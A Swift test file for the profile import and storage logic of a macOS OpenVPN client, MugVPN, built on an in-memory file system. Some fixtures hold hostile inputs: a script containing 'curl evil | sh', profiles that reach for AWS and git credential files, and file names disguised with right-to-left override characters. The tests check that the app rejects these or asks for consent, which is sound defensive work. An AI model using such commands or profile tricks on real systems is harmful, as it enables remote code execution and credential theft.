import Foundation
import MugVPNAppCore

/// An in-memory file tree.
final class MemFS: ProfileFileSystem {
    var files: [String: Data] = [:]
    var dirs: Set<String> = ["/"]

    func add(_ path: String, _ text: String = "") {
        files[path] = Data(text.utf8)
        var d = (path as NSString).deletingLastPathComponent
        while d != "/" && !d.isEmpty { dirs.insert(d); d = (d as NSString).deletingLastPathComponent }
    }
    func text(_ path: String) -> String? { files[path].map { String(decoding: $0, as: UTF8.self) } }

    func contents(of dir: String) -> [(name: String, isDirectory: Bool)] {
        let prefix = dir.hasSuffix("/") ? dir : dir + "/"
        var out: [String: Bool] = [:]
        for f in files.keys where f.hasPrefix(prefix) {
            let rest = f.dropFirst(prefix.count)
            let first = String(rest.split(separator: "/")[0])
            out[first] = (out[first] ?? false) || rest.contains("/")
        }
        for d in dirs where d.hasPrefix(prefix) {
            out[String(d.dropFirst(prefix.count).split(separator: "/")[0])] = true
        }
        return out.map { ($0.key, $0.value) }
    }
    /// Symlinked folders: path prefix -> where it really is.
    var links: [String: String] = [:]
    func realPath(_ path: String) -> String {
        for (from, to) in links where path == from || path.hasPrefix(from + "/") { return to + path.dropFirst(from.count) }
        return path
    }
    func read(_ path: String) -> Data? { files[realPath(path)] }
    func exists(_ path: String) -> Bool { files[path] != nil || dirs.contains(path) }
    /// Writes that succeed before every next one fails (nil: none fail); moves to these paths fail.
    var writesBeforeFailure: Int?
    var failMovesTo: Set<String> = []
    func write(_ path: String, _ data: Data) throws {
        guard dirs.contains((path as NSString).deletingLastPathComponent) else { throw CocoaError(.fileNoSuchFile) }
        if let n = writesBeforeFailure {
            guard n > 0 else { throw CocoaError(.fileWriteOutOfSpace) }
            writesBeforeFailure = n - 1
        }
        files[path] = data
    }
    func move(_ from: String, _ to: String) throws {
        guard exists(from), !exists(to) else { throw CocoaError(.fileWriteFileExists) }
        guard !failMovesTo.contains(to) else { throw CocoaError(.fileWriteNoPermission) }
        for (k, v) in files where k == from || k.hasPrefix(from + "/") {
            files[k] = nil
            files[to + k.dropFirst(from.count)] = v
        }
        for d in dirs where d == from || d.hasPrefix(from + "/") {
            dirs.remove(d)
            dirs.insert(to + d.dropFirst(from.count))
        }
    }
    var failRemoves = false
    func remove(_ path: String) throws {
        if failRemoves { throw CocoaError(.fileWriteNoPermission) }
        files = files.filter { !($0.key == path || $0.key.hasPrefix(path + "/")) }
        dirs = dirs.filter { !($0 == path || $0.hasPrefix(path + "/")) }
    }
    func makeDirectory(_ path: String) throws {
        guard !exists(path) else { throw CocoaError(.fileWriteFileExists) }
        add(path + "/.keep")
        files[path + "/.keep"] = nil
        dirs.insert(path)
    }
}

let userDir = "/Users/u/Library/Application Support/MugVPN/config"
let systemDir = "/Library/Application Support/MugVPN/config"

let autoDir = "/Library/Application Support/MugVPN/config-auto"

/// Contents that pass the checks (PEM blocks of the right type).
let testPEMCert = "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n"
let testPEMKey = "-----BEGIN PRIVATE KEY-----\nMIIE\n-----END PRIVATE KEY-----\n"

private func store(_ fs: MemFS, ext: String = "ovpn") -> ProfileStore {
    ProfileStore(fs: fs, userDir: userDir, systemDir: systemDir, autoDir: autoDir, ext: ext)
}

private let minimal = "client\ndev tun\nremote vpn.example.com 1194\n"

func registerProfileTests() {
    test("PRF-01", "profiles in the user folder and its first-level subfolders") {
        let fs = MemFS()
        fs.add("\(userDir)/office.ovpn", minimal)
        fs.add("\(userDir)/home/home.ovpn", minimal)
        fs.add("\(userDir)/a/b/deep.ovpn", minimal)
        fs.add("\(userDir)/notes.txt")
        fs.add("\(userDir)/OFFICE2.OVPN", minimal)
        let p = store(fs).scan()
        expectEqual(p.map(\.name), ["home", "office", "OFFICE2"])
        expectEqual(p.first { $0.name == "home" }?.folder, "home")
        expectEqual(p.first { $0.name == "office" }?.folder, "")
        expectEqual(p.first { $0.name == "office" }?.path, "\(userDir)/office.ovpn")
        expect(p.allSatisfy { $0.source == .user })
    }
    test("PRF-02", "system profiles") {
        let fs = MemFS()
        fs.add("\(systemDir)/corp.ovpn", minimal)
        fs.add("\(userDir)/mine.ovpn", minimal)
        let p = store(fs).scan()
        expectEqual(p.map(\.name), ["corp", "mine"])
        expectEqual(p.map(\.source), [.system, .user])
    }
    test("PRF-03", "same name in two places: both shown, told apart") {
        let fs = MemFS()
        fs.add("\(systemDir)/vpn.ovpn", minimal)
        fs.add("\(userDir)/vpn.ovpn", minimal)
        fs.add("\(userDir)/x/vpn.ovpn", minimal)
        let p = store(fs).scan()
        expectEqual(p.count, 3)
        expectEqual(Set(p.map(\.displayName)), ["vpn", "vpn (x)", "vpn (system)"])
        expectEqual(Set(p.map(\.id)).count, 3, "ids are unique")
    }
    test("PRF-04", "other extension") {
        let fs = MemFS()
        fs.add("\(userDir)/a.conf", minimal)
        fs.add("\(userDir)/b.ovpn", minimal)
        expectEqual(store(fs, ext: "conf").scan().map(\.name), ["a"])
    }
    test("PRF-05", "rescan sees changes") {
        let fs = MemFS()
        let s = store(fs)
        expect(s.scan().isEmpty)
        fs.add("\(userDir)/new.ovpn", minimal)
        expectEqual(s.scan().map(\.name), ["new"])
        fs.files["\(userDir)/new.ovpn"] = nil
        expect(s.scan().isEmpty)
    }
    test("PRF-06", "import a profile with the files it names") {
        let fs = MemFS()
        fs.add("/Downloads/work.ovpn", "client\ndev tun\nremote w 1194\nca ca.crt\ncert keys/me.crt\nkey /abs/me.key\ntls-auth [inline]\n<tls-auth>\n\(testStaticKey)</tls-auth>\n")
        fs.add("/Downloads/ca.crt", testPEMCert)
        fs.add("/Downloads/keys/me.crt", testPEMCert)
        fs.add("/abs/me.key", testPEMKey)
        let r = try store(fs).importProfile(at: "/Downloads/work.ovpn", allowOutside: true)
        expectEqual(r.profile.name, "work")
        expectEqual(r.profile.path, "\(userDir)/work/work.ovpn")
        expectEqual(fs.text("\(userDir)/work/ca.crt"), testPEMCert)
        expectEqual(fs.text("\(userDir)/work/keys/me.crt"), testPEMCert)
        expectEqual(fs.text("\(userDir)/work/me.key"), testPEMKey, "outside files are copied in")
        let copy = fs.text("\(userDir)/work/work.ovpn") ?? ""
        expect(copy.contains("key me.key") || copy.contains("key \"me.key\""), "the copy names the copied key: \(copy)")
        expect(copy.contains("ca ca.crt"), "relative names stay as they were")
        let again = try store(fs).importProfile(at: "/Downloads/work.ovpn", allowOutside: true)
        expectEqual(again.profile.name, "work (2)")
        expectEqual(again.profile.path, "\(userDir)/work (2)/work (2).ovpn")
    }
    test("PRF-13", "an imported profile cannot bring a script") {
        let fs = MemFS()
        fs.add("/D/office.ovpn", "client\nremote o 1194\nauth-user-pass office_pre.sh\n")
        fs.add("/D/office_pre.sh", "#\n#\ncurl evil | sh\n")
        expectThrows("a referenced .sh", matching: "script") { _ = try store(fs).importProfile(at: "/D/office.ovpn") }
        fs.add("/D/other.ovpn", "client\nremote o 1194\nca x_UP.SH\n")
        fs.add("/D/x_UP.SH", "CA")
        expectThrows("any case", matching: "script") { _ = try store(fs).importProfile(at: "/D/other.ovpn") }
        expect(!fs.exists("\(userDir)/office") && !fs.exists("\(userDir)/other"), "nothing copied")
    }
    test("PRF-14", "files outside the profile's folder only with consent") {
        let fs = MemFS()
        fs.add("/Users/u/Downloads/x/evil.ovpn", "client\nremote e 1194\nauth-user-pass /Users/u/.aws/credentials\nca ../../ca.crt\n")
        fs.add("/Users/u/.aws/credentials", "AKIA\nsecret\n")
        fs.add("/Users/u/ca.crt", testPEMCert)
        do {
            _ = try store(fs).importProfile(at: "/Users/u/Downloads/x/evil.ovpn")
            expect(false, "imported without asking")
        } catch let e as ImportNeedsConsent {
            expectEqual(e.outside, ["/Users/u/.aws/credentials", "/Users/u/ca.crt"])
        }
        expect(!fs.exists("\(userDir)/evil"), "nothing copied before the user agrees")
        let r = try store(fs).importProfile(at: "/Users/u/Downloads/x/evil.ovpn", allowOutside: true)
        expectEqual(fs.text("\(r.profile.path.replacingOccurrences(of: "evil.ovpn", with: "credentials"))"), "AKIA\nsecret\n")
        // Inside the folder needs no consent.
        fs.add("/D/in/ok.ovpn", "client\nremote o 1194\nca keys/ca.crt\n")
        fs.add("/D/in/keys/ca.crt", testPEMCert)
        _ = try store(fs).importProfile(at: "/D/in/ok.ovpn")
    }
    test("PRF-15", "a referenced file must be small") {
        let fs = MemFS()
        fs.add("/D/big.ovpn", "client\nremote o 1194\nca big.crt\n")
        fs.files["/D/big.crt"] = Data(count: ProfileStore.maxFileBytes + 1)
        expectThrows(matching: "large") { _ = try store(fs).importProfile(at: "/D/big.ovpn") }
    }
    test("PRF-16", "saved passwords belong to a profile, not to a name") {
        let keys = [Profile(name: "office", path: "\(userDir)/office/office.ovpn", source: .user, folder: "office"),
                    Profile(name: "office", path: "\(userDir)/office.ovpn", source: .user, folder: ""),
                    Profile(name: "office", path: "\(userDir)/team/office.ovpn", source: .user, folder: "team"),
                    Profile(name: "office", path: "\(systemDir)/office.ovpn", source: .system, folder: ""),
                    Profile(name: "office", path: "/L/config-auto/office.ovpn", source: .persistent, folder: "")].map(\.secretsKey)
        expectEqual(Set(keys).count, keys.count, "\(keys)")
    }
    test("PRF-17", "a new profile does not inherit a gone one's passwords or options") {
        let fs = MemFS()
        fs.add("/D/office.ovpn", "client\nremote o 1194\n")
        let store = ProfileStore(fs: fs, userDir: userDir, systemDir: systemDir)
        let secrets = FakeSecrets()
        let opts = ProfileOptionsStore(backend: FakeSettingsBackend())
        let key = Profile(name: "office", path: "\(userDir)/office/office.ovpn", source: .user, folder: "office")
        secrets.set(key.secretsKey, .password, "old")
        var o = ProfileOptions(); o.killSwitch = true
        opts.set(key.id, o)
        let r = try store.importProfile(at: "/D/office.ovpn", secrets: secrets, options: opts)
        expectEqual(r.profile.secretsKey, key.secretsKey)
        expectEqual(secrets.get(key.secretsKey, .password), nil)
        expectEqual(opts.options(key.id), ProfileOptions())
        secrets.set("user:New/New", .password, "old")
        let n = try store.create(name: "New", config: "client\nremote a 1194\n", secrets: secrets, options: opts)
        expectEqual(secrets.get(n.secretsKey, .password), nil)
    }
    test("PRF-18", "profile names without control, line-break or direction characters") {
        let fs = MemFS()
        let store = ProfileStore(fs: fs, userDir: userDir, systemDir: systemDir)
        for bad in ["a\nb", "a\tb", "evil\u{202E}gpj.ovpn", "x\u{0}y", "\u{200F}x"] {
            expectThrows("\(bad.unicodeScalars.map { $0.value })") { _ = try store.create(name: bad, config: "client\nremote a\n") }
        }
        expectEqual(ProfileDownloader.plainName("a\nb\u{202E}c"), "a_b_c")
    }
    test("PRF-19", "no script comes with an imported profile, whatever its name looks like") {
        for name in ["evil_pre.\u{17F}h", "EVIL_PRE.SH", "evil_up.\u{FF53}\u{FF48}", "x.Sh"] {
            let fs = MemFS()
            fs.add("/D/evil.ovpn", "client\ndev tun\nremote x 1194\nca \"\(name)\"\n")
            fs.add("/D/\(name)", "#!/bin/sh\n")
            expectThrows(name, matching: "script") { _ = try store(fs).importProfile(at: "/D/evil.ovpn") }
        }
    }
    test("PRF-20", "a file reached through a linked folder is outside the profile's folder") {
        let fs = MemFS()
        fs.add("/D/corp/corp.ovpn", "client\ndev tun\nremote x 1194\nauth-user-pass k/.git-credentials\n")
        fs.add("/Users/u/.git-credentials", "token\n")
        fs.dirs.insert("/D/corp/k")
        fs.links["/D/corp/k"] = "/Users/u"
        expectThrows("needs consent") { _ = try store(fs).importProfile(at: "/D/corp/corp.ovpn") }
        do {
            _ = try store(fs).importProfile(at: "/D/corp/corp.ovpn")
        } catch let e as ImportNeedsConsent {
            expectEqual(e.outside, ["/Users/u/.git-credentials"], "the real place is shown")
        }
    }
    test("PRF-21", "an imported profile's name is a plain name") {
        let fs = MemFS()
        fs.add("/D/a.ovpn", "client\ndev tun\nremote x 1194\n")
        let r = try store(fs).importProfile(at: "/D/a.ovpn", as: "evil\u{202E}gpj\nx")
        expectEqual(r.profile.name, "evil_gpj_x")
    }
    test("PRF-25", "the files a profile names hold what they are named as: said at import and save, not first at Connect") {
        let fs = MemFS()
        fs.add("/D/office.ovpn", "client\ndev tun\nremote o 1194\nca ca.crt\n")
        fs.add("/D/ca.crt", "not a certificate")
        expectThrows("import", matching: "ca.crt") { _ = try store(fs).importProfile(at: "/D/office.ovpn") }
        expect(!fs.exists("\(userDir)/office"), "nothing copied")
        fs.add("/D/ca.crt", "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n")
        let p = try store(fs).importProfile(at: "/D/office.ovpn").profile
        fs.add("\(userDir)/office/me.key", "not a key")
        expectThrows("save", matching: "me.key") { try store(fs).save(p, config: "client\ndev tun\nremote o 1194\nca ca.crt\nkey me.key\ncert ca.crt\n") }
    }
    test("PRF-26", "an import that fails half-way leaves nothing (no half profile, no staging folder)") {
        let fs = MemFS()
        fs.add("/D/office.ovpn", "client\ndev tun\nremote o 1194\nca ca.crt\ncert me.crt\n")
        fs.add("/D/ca.crt", testPEMCert)
        fs.add("/D/me.crt", testPEMCert)
        fs.writesBeforeFailure = 1
        expectThrows("import") { _ = try store(fs).importProfile(at: "/D/office.ovpn") }
        fs.writesBeforeFailure = nil
        expectEqual(fs.contents(of: userDir).map(\.name), [], "nothing left in the profiles folder")
        expect(store(fs).scan().isEmpty)
    }
    test("PRF-27", "a rename that cannot finish leaves the profile as it was") {
        let fs = MemFS()
        fs.add("/D/office.ovpn", "client\ndev tun\nremote o 1194\n")
        let p = try store(fs).importProfile(at: "/D/office.ovpn").profile
        fs.failMovesTo = ["\(userDir)/berlin/berlin.ovpn", "\(userDir)/office/berlin.ovpn"]
        expectThrows("rename") { _ = try store(fs).rename(p, to: "berlin", active: []) }
        expectEqual(store(fs).scan().map(\.path), [p.path], "still where it was, named as it was")
    }
    test("PRF-28", "a Tunnelblick configuration with several profiles: all of them or none") {
        let fs = MemFS()
        fs.add("/D/Office.tblk/Contents/Resources/a.ovpn", "client\ndev tun\nremote a 1194\n")
        fs.add("/D/Office.tblk/Contents/Resources/b.ovpn", "client\ndev tun\nremote b 1194\nca missing.crt\n")
        expectThrows("b cannot be imported") { _ = try store(fs).importTunnelblick(at: "/D/Office.tblk") }
        expect(store(fs).scan().isEmpty, "a is not left alone")
    }
    test("PRF-29", "a rename the keychain does not follow: the saved passwords stay under the old name, not lost") {
        let secrets = FakeSecrets()
        secrets.items["old|password"] = "p"
        secrets.refuses = true
        expect(!ProfileSecrets.renamed(secrets, from: "old", to: "new"))
        expectEqual(secrets.items["old|password"], "p", "kept")
        secrets.refuses = false
        expect(ProfileSecrets.renamed(secrets, from: "old", to: "new"))
        expectEqual(secrets.items["new|password"], "p")
        expect(secrets.items["old|password"] == nil)
    }
    test("PRF-30", "every profile shown by a name of its own, however names and folders repeat (windows go by it)") {
        let fs = MemFS()
        fs.add("\(systemDir)/a/office.ovpn", "client\n")
        fs.add("\(systemDir)/b/office.ovpn", "client\n")
        fs.add("\(userDir)/system/office.ovpn", "client\n")
        fs.add("\(userDir)/Office.ovpn", "client\n")
        let shown = store(fs).scan().map(\.displayName)
        expectEqual(Set(shown.map { $0.lowercased() }).count, shown.count, "\(shown)")
    }
    test("PRF-31", "a new profile that cannot be written leaves no folder (its name stays free)") {
        let fs = MemFS()
        fs.writesBeforeFailure = 0
        expectThrows("create") { _ = try store(fs).create(name: "office", config: "client\ndev tun\nremote o 1194\n") }
        fs.writesBeforeFailure = nil
        expect(!fs.exists("\(userDir)/office"))
        expect((try? store(fs).create(name: "office", config: "client\ndev tun\nremote o 1194\n")) != nil, "the name is free")
    }
    test("PRF-32", "a rename the keychain does not follow is not made: files and saved passwords as they were") {
        let fs = MemFS()
        fs.add("/D/office.ovpn", "client\ndev tun\nremote o 1194\n")
        let p = try store(fs).importProfile(at: "/D/office.ovpn").profile
        let secrets = FakeSecrets()
        secrets.items["\(p.secretsKey)|password"] = "p"
        secrets.refuses = true
        expectThrows("rename", matching: "keychain") { _ = try store(fs).rename(p, to: "berlin", active: [], secrets: secrets) }
        expectEqual(store(fs).scan().map(\.path), [p.path])
        expectEqual(secrets.items["\(p.secretsKey)|password"], "p")
        secrets.refuses = false
        let r = try store(fs).rename(p, to: "berlin", active: [], secrets: secrets)
        expectEqual(secrets.items["\(r.secretsKey)|password"], "p")
        expect(secrets.items["\(p.secretsKey)|password"] == nil)
    }
    test("PRF-33", "a rename does not take on the saved passwords of a removed profile that had the new name") {
        let fs = MemFS()
        fs.add("/D/office.ovpn", "client\ndev tun\nremote o 1194\n")
        let p = try store(fs).importProfile(at: "/D/office.ovpn").profile
        let secrets = FakeSecrets()
        secrets.items["user:berlin/berlin|password"] = "old berlin's"
        let r = try store(fs).rename(p, to: "berlin", active: [], secrets: secrets)
        expect(secrets.items["\(r.secretsKey)|password"] == nil, "nothing inherited: \(secrets.items)")
    }
    test("PRF-34", "a new profile never gets another's saved passwords: the keychain must clear them first, or nothing is made") {
        let fs = MemFS()
        fs.add("/D/office.ovpn", "client\ndev tun\nremote o 1194\n")
        let secrets = FakeSecrets()
        secrets.items["user:office/office|password"] = "a removed profile's"
        secrets.refuses = true
        expectThrows("import", matching: "keychain") { _ = try store(fs).importProfile(at: "/D/office.ovpn", secrets: secrets) }
        expect(store(fs).scan().isEmpty, "not imported")
        expectThrows("create", matching: "keychain") {
            _ = try store(fs).create(name: "office", config: "client\ndev tun\nremote o 1194\n", secrets: secrets)
        }
        expect(store(fs).scan().isEmpty, "not created")
        secrets.refuses = false
        _ = try store(fs).importProfile(at: "/D/office.ovpn", secrets: secrets)
        expect(secrets.items["user:office/office|password"] == nil, "cleared before it is there")
    }
    test("PRF-35", "deleting a profile whose saved passwords the keychain keeps: not deleted, said why") {
        let fs = MemFS()
        fs.add("/D/office.ovpn", "client\ndev tun\nremote o 1194\n")
        let p = try store(fs).importProfile(at: "/D/office.ovpn").profile
        let secrets = FakeSecrets()
        secrets.items["\(p.secretsKey)|password"] = "p"
        secrets.refuses = true
        expectThrows("delete", matching: "keychain") { try store(fs).delete(p, active: [], secrets: secrets) }
        expectEqual(store(fs).scan().map(\.path), [p.path])
    }
    test("PRF-36", "deleting a profile whose files will not go: said, and back in sight (not hidden away)") {
        let fs = MemFS()
        fs.add("/D/office.ovpn", "client\ndev tun\nremote o 1194\n")
        let p = try store(fs).importProfile(at: "/D/office.ovpn").profile
        fs.failRemoves = true
        expectThrows("delete", matching: "could not be removed") { try store(fs).delete(p, active: []) }
        fs.failRemoves = false
        expectEqual(store(fs).scan().map(\.path), [p.path], "back where it was")
        expect(!fs.contents(of: userDir).contains { $0.name.hasPrefix(".deleting") }, "nothing hidden left")
    }
    test("PRF-37", "deleting a profile whose files will neither go nor come back: where they are is said") {
        let fs = MemFS()
        fs.add("/D/office.ovpn", "client\ndev tun\nremote o 1194\n")
        let p = try store(fs).importProfile(at: "/D/office.ovpn").profile
        fs.failRemoves = true
        fs.failMovesTo = ["\(userDir)/office"]
        expectThrows("delete", matching: ".deleting-") { try store(fs).delete(p, active: []) }
    }
    test("PRF-24", "files dropped on MugVPN: profiles (.ovpn, .conf) and Tunnelblick configurations (.tblk) only") {
        expectEqual(ProfileStore.importable(["/a/office.ovpn", "/a/LAB.OVPN", "/a/x.conf", "/a/y.tblk", "/a/notes.txt", "/a/key.pem", "/a/ovpn"]),
                    ["/a/office.ovpn", "/a/LAB.OVPN", "/a/x.conf", "/a/y.tblk"])
    }
    test("PRF-23", "finding profiles: every word, in the name, folder or where it comes from; any case") {
        let ps = [Profile(name: "office", path: "/u/work/office.ovpn", source: .user, folder: "work", displayName: "office (work)"),
                  Profile(name: "home-lab", path: "/u/home-lab.ovpn", source: .user, folder: ""),
                  Profile(name: "corp", path: "/s/corp.ovpn", source: .system, folder: "", displayName: "corp (system)")]
        expectEqual(ProfileStore.matching(ps, "").map(\.name), ["office", "home-lab", "corp"])
        expectEqual(ProfileStore.matching(ps, "  LAB ").map(\.name), ["home-lab"])
        expectEqual(ProfileStore.matching(ps, "work off").map(\.name), ["office"], "every word")
        expectEqual(ProfileStore.matching(ps, "system").map(\.name), ["corp"])
        expectEqual(ProfileStore.matching(ps, "nothing").map(\.name), [])
    }
    test("PRF-22", "a profile names no other profile as a file; each file is read once") {
        let fs = MemFS()
        fs.add("/D/a.ovpn", "client\ndev tun\nremote x 1194\nca other.ovpn\n")
        fs.add("/D/other.ovpn", "client\nremote y 1194\n")
        expectThrows("a profile as a file", matching: "profile") { _ = try store(fs).importProfile(at: "/D/a.ovpn") }
    }
    test("PRF-07", "import a Tunnelblick .tblk") {
        let fs = MemFS()
        fs.add("/D/Office.tblk/Contents/Resources/config.ovpn", "client\ndev tun\nremote o 1194\nca ca.crt\n")
        fs.add("/D/Office.tblk/Contents/Resources/ca.crt", testPEMCert)
        fs.add("/D/Office.tblk/Contents/Resources/up.sh", "#!/bin/sh")
        fs.add("/D/Office.tblk/Contents/Info.plist", "<plist/>")
        let r = try store(fs).importTunnelblick(at: "/D/Office.tblk")
        expectEqual(r.map(\.profile.name), ["Office"])
        expectEqual(fs.text("\(userDir)/Office/ca.crt"), testPEMCert)
        expectEqual(r[0].skipped, ["up.sh"], "Tunnelblick scripts are not imported")
        let flat = MemFS()
        flat.add("/D/Two.tblk/a.ovpn", "client\ndev tun\nremote a 1194\n")
        flat.add("/D/Two.tblk/b.ovpn", "client\ndev tun\nremote b 1194\n")
        expectEqual(try store(flat).importTunnelblick(at: "/D/Two.tblk").map(\.profile.name), ["Two-a", "Two-b"],
                    "several configs, and the flat layout")
        let empty = MemFS()
        empty.add("/D/E.tblk/Contents/Info.plist")
        expectThrows(matching: "no OpenVPN") { _ = try store(empty).importTunnelblick(at: "/D/E.tblk") }
    }
    test("PRF-08", "a profile MugVPN would refuse is refused at import") {
        let fs = MemFS()
        fs.add("/D/bad.ovpn", "client\nup /bin/sh\n")
        expectThrows(matching: "up") { _ = try store(fs).importProfile(at: "/D/bad.ovpn") }
        fs.add("/D/missing.ovpn", "client\nca nothere.crt\n")
        expectThrows(matching: "nothere.crt") { _ = try store(fs).importProfile(at: "/D/missing.ovpn") }
        fs.add("/D/broken.ovpn", "ca \"x\n")
        expectThrows(matching: "unterminated") { _ = try store(fs).importProfile(at: "/D/broken.ovpn") }
        expect(!fs.exists("\(userDir)/bad") && !fs.exists("\(userDir)/missing"), "nothing copied")
    }
    test("PRF-09", "profiles from Windows to offer for import") {
        let fs = MemFS()
        fs.add("/Users/u/OpenVPN/config/office.ovpn", minimal)
        fs.add("/Users/u/OpenVPN/config/home/home.ovpn", minimal)
        fs.add("\(userDir)/office/office.ovpn", minimal)
        expectEqual(store(fs).windowsCandidates(home: "/Users/u"), ["/Users/u/OpenVPN/config/home/home.ovpn"],
                    "already imported ones are left out")
    }
    test("PRF-10", "menu layout") {
        func profiles(_ n: Int) -> [Profile] {
            (0..<n).map { Profile(name: "p\($0)", path: "/x/f\($0 % 3)/p\($0).ovpn", source: .user, folder: "f\($0 % 3)") }
        }
        let few = ProfileStore.menu(profiles(25), mode: .auto)
        expectEqual(few.count, 25)
        expect(few.allSatisfy { if case .profile = $0 { return true }; return false })
        let many = ProfileStore.menu(profiles(26), mode: .auto)
        expectEqual(many.map(\.title), ["f0", "f1", "f2"])
        expectEqual(ProfileStore.menu(profiles(3), mode: .nested).map(\.title), ["f0", "f1", "f2"])
        expectEqual(ProfileStore.menu(profiles(30), mode: .flat).count, 30)
        let mixed = [Profile(name: "top", path: "/x/top.ovpn", source: .user, folder: ""),
                     Profile(name: "in", path: "/x/f/in.ovpn", source: .user, folder: "f")]
        expectEqual(ProfileStore.menu(mixed, mode: .nested).map(\.title), ["f", "top"], "folders first, then loose profiles")
    }
    test("PER-07", "persistent profiles listed") {
        let fs = MemFS()
        fs.add("\(autoDir)/site.ovpn", minimal)
        fs.add("\(userDir)/site.ovpn", minimal)
        fs.add("\(autoDir)/sub/x.ovpn", minimal)
        let p = store(fs).scan()
        expectEqual(Set(p.map(\.displayName)), ["site", "site (persistent)"])
        expectEqual(p.first { $0.source == .persistent }?.path, "\(autoDir)/site.ovpn")
        expect(!p.contains { $0.name == "x" }, "config-auto has no subfolders")
        expectEqual(ProfileStore.menu(p, mode: .flat).count, 2)
    }
    test("PRF-12", "a file without a remote is not a profile") {
        let fs = MemFS()
        for (name, text) in [("empty", ""), ("comments", "# nothing\n; here\n"), ("noremote", "client\ndev tun\n")] {
            fs.add("/D/\(name).ovpn", text)
            expectThrows(name, matching: "not an OpenVPN profile") { _ = try store(fs).importProfile(at: "/D/\(name).ovpn") }
            expect(!fs.exists("\(userDir)/\(name)"), "\(name): nothing copied")
        }
        fs.add("/D/conn.ovpn", "client\ndev tun\n<connection>\nremote a 1194\n</connection>\n")
        expect((try? store(fs).importProfile(at: "/D/conn.ovpn")) != nil, "a remote inside <connection> counts")
    }
    test("PRF-11", "natural, case-insensitive order") {
        let fs = MemFS()
        for n in ["a10", "a2", "B1", "a1"] { fs.add("\(userDir)/\(n).ovpn", minimal) }
        expectEqual(store(fs).scan().map(\.name), ["a1", "a2", "a10", "B1"])
    }
}
